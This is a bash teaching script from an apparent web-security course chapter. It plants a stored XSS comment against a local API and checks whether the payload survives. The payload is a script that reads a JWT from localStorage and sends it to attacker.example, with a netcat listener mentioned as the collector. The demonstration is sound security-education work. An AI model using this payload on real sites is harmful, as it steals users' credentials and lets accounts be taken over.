#!/usr/bin/env bash
#
# Chapter 14 — XSS exfiltrates a JWT from localStorage
#
# This attack pairs with Chapter 15 (stored XSS via product comments).
#
# 1. Post a comment whose body is a <script> that reads localStorage.token
#    and POSTs it to an attacker-controlled endpoint
# 2. When a victim views the comments list with the VULNERABLE frontend
#    (token in localStorage + dangerouslySetInnerHTML), the script runs
#    and the token reaches the attacker
#
# Reproducing the exfiltration end-to-end requires:
#   - Vulnerable frontend (chapters/14-frontend-auth-patterns/vulnerable/auth.ts)
#   - Vulnerable comment renderer (chapters/15-xss/vulnerable/CommentList.tsx)
#   - An attacker collector (we use a netcat one-shot listener)
#
# This script demonstrates step 1 (planting the payload) and step 2
# (showing the API returns the raw payload). Running an actual browser
# to fire the script is left as a manual step — open the React app in
# Chrome after the payload is planted and watch the netcat output.

set -euo pipefail
API="${API:-http://localhost:8080}"
PRODUCT_ID='aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
gray() { printf '\033[90m%s\033[0m\n' "$*"; }

# The payload reads localStorage.token and POSTs it to attacker.example.
# In a real attack the attacker controls a domain; here we just show the
# payload makes it through the API unchanged.
PAYLOAD='<script>fetch("https://attacker.example/steal?t="+encodeURIComponent(localStorage.getItem("auth.token")||"none"))</script>'

bold "[1/2] Plant the XSS payload as a product comment"
BODY=$(python3 -c "import json,sys; print(json.dumps({
  'productId':'$PRODUCT_ID','authorEmail':'attacker@x.com','body':sys.argv[1]}))" "$PAYLOAD")
RESP=$(curl -sS -X POST "${API}/api/comments" \
  -H 'Content-Type: application/json' \
  -d "$BODY")
echo "  $RESP"
echo

bold "[2/2] Read it back and check whether the script tag survived"
STORED=$(curl -sS "${API}/api/comments?productId=${PRODUCT_ID}" \
  | python3 -c "import sys,json; rows=json.load(sys.stdin); print(rows[0]['body'] if rows else '')")
echo "  Stored body:"
echo "  ${STORED:0:200}"
echo

if echo "$STORED" | grep -q '<script>'; then
  bold "ATTACK SUCCEEDED — payload survives the API."
  echo
  echo "  Now open the React app at http://localhost:5173/products/keyboard"
  echo "  with the VULNERABLE frontend in place. The script fires:"
  echo "    1. localStorage.getItem('auth.token') reads the JWT"
  echo "    2. fetch(attacker, {body: token}) exfiltrates it"
  echo
  echo "  The attacker now holds the user's credential for its TTL (15 min default)."
  exit 1
else
  bold "ATTACK BLOCKED — server escaped the HTML."
  echo "  The frontend localStorage choice still matters for OTHER XSS"
  echo "  vectors (DOM XSS, dependency XSS, vendor widget XSS) — see Ch 15."
fi
